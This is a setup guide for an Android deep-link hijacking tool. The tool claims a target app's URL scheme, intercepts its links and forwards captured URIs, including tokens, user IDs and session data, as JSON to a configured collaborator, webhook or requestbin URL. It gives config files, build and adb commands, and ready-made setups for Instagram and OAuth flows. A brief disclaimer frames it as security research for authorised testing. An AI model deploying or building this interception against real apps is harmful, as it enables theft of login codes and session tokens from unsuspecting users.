# Deep Link Proxy - Configuration Guide

## Quick Setup (3 Steps)

### Step 1: Configure Target App & Server

Edit `app/src/main/res/values/config.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <!-- Your Burp Collaborator or webhook URL -->
    <string name="server_url">https://YOUR-COLLABORATOR-ID.oastify.com</string>
    
    <!-- Target app package name (find using: adb shell pm list packages | grep YOUR_APP) -->
    <string name="target_package">com.example.targetapp</string>
    
    <!-- Deep link scheme to intercept (e.g., myapp, instagram, facebook) -->
    <string name="deep_link_scheme">myapp</string>
</resources>
```

### Step 2: Update AndroidManifest.xml

The scheme is automatically configured from `config.xml`, but verify:

```xml
<data android:scheme="@string/deep_link_scheme" />
```

### Step 3: Build & Install

```bash
./gradlew assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

## Advanced Configuration

### Optional Settings

Add these to `config.xml` for more control:

```xml
<!-- Delay before forwarding to real app (milliseconds) -->
<integer name="forward_delay_ms">1000</integer>

<!-- Enable/disable local logging -->
<bool name="enable_local_logging">true</bool>

<!-- Show toast notifications (for debugging) -->
<bool name="show_notifications">false</bool>
```

## Finding Target Package Name

```bash
# List all installed packages
adb shell pm list packages

# Find specific app
adb shell pm list packages | grep YOUR_APP_NAME

# Get detailed info
adb shell dumpsys package YOUR_PACKAGE_NAME | grep Activity
```

## Testing

```bash
# Test the deep link interception
adb shell am start -a android.intent.action.VIEW -d "myapp://test?param=value"

# Monitor logs
adb logcat | grep DeepLinkProxy

# Extract captured data
./extract_logs.sh
```

## What Gets Captured

✅ Full deep link URI  
✅ All query parameters  
✅ Fragment data  
✅ URL encoding details  
✅ Timestamp and device info  
✅ User ID, tokens, session data (if present)  

## Data Exfiltration

All data is sent to your configured `server_url` as JSON:

```json
{
  "full_uri": "myapp://action?token=abc123",
  "scheme": "myapp",
  "host": "action",
  "parameters": {
    "token": "abc123"
  },
  "timestamp": 1234567890,
  "device": "Pixel 7a",
  "android_version": "14"
}
```

## Security Considerations

⚠️ **This is a security research tool**  
- Only use on apps you own or have permission to test  
- Deep link interception can be detected by observant users  
- Some apps implement certificate pinning or other anti-tampering measures  
- Always follow responsible disclosure practices  

## Troubleshooting

**Problem:** Proxy app doesn't show up when clicking deep link  
**Solution:** Make sure the scheme in `config.xml` exactly matches the target app's scheme

**Problem:** Real app not launching after interception  
**Solution:** Verify `target_package` is correct using `adb shell pm list packages`

**Problem:** No data reaching collaborator  
**Solution:** Check internet permission in AndroidManifest.xml and verify collaborator URL

## Example Configurations

### Instagram Deep Links
```xml
<string name="server_url">https://your-collab.oastify.com</string>
<string name="target_package">com.instagram.android</string>
<string name="deep_link_scheme">instagram</string>
```

### Custom OAuth Flow
```xml
<string name="server_url">https://your-webhook.com/capture</string>
<string name="target_package">com.example.oauth_app</string>
<string name="deep_link_scheme">myapp</string>
```

### Universal Links Testing
```xml
<string name="server_url">https://requestbin.com/YOUR_BIN</string>
<string name="target_package">com.company.app</string>
<string name="deep_link_scheme">companyapp</string>
```

